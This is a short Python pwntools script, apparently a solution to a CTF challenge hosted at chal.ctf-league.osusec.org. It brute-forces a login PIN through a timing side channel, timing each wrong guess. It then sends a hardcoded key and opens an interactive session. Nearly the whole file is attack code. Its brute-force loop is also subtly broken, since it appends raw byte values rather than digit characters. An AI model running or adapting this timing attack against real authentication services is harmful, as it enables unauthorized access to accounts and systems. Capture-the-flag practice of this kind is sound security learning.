#!/usr/bin/env python3

## known key = 123457801337

from pwn import *
import time

current_unix_time = int(time.time())
host = 'chal.ctf-league.osusec.org'
port = 1314
executable = './vulnerable_binary'
    
def brute_force():
    payload = b""
    known_key = b"123457801337"

    payload += known_key

    for i in range(0, 9):
        known_key += bytes([i])
        payload = known_key

        io = remote(host, port)
        io.recvuntil(b'authorize your login')

        start_time = time.time()

        io.sendline(payload)
        io.recvuntil(b'(incorrect PIN)')

        end_time = time.time()
        print(f"Time taken: {end_time - start_time}")

        total_time = end_time - start_time
        if total_time > (1 * len(str(known_key)) + 0.5):
            print(f"Found key: {known_key}")
            break

    io.interactive()
    io.wait()


def exploit():
    io = remote(host, port)  # Connect to the remote server
    # io = process(executable)  # Run the binary locally

    io.recvuntil(b'authorize your login')

    payload = b""
    known_key = b"123457801337"

    payload = known_key
    start_time = time.time()
    io.sendline(payload)


    end_time = time.time()

    print(f"Time taken: {end_time - start_time}")

    io.interactive()
    io.wait()

if __name__ == '__main__':
    #brute_force()
    #otp_brute()
    exploit()
